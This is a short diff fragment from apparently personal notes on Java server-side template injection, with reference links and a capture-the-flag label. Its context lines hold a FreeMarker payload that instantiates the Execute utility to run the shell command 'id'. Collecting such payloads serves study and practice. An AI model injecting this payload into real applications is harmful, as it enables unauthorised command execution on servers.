@@ -11,3 +11,4 @@ https://yq.aliyun.com/articles/519369
 
 <#assign test="freemarker.template.utility.Execute"?new()>
 ${test("id")}
+-----http://exp-blog.com/2019/03/10/pid-3528/   ROOTME JAVA SSTI
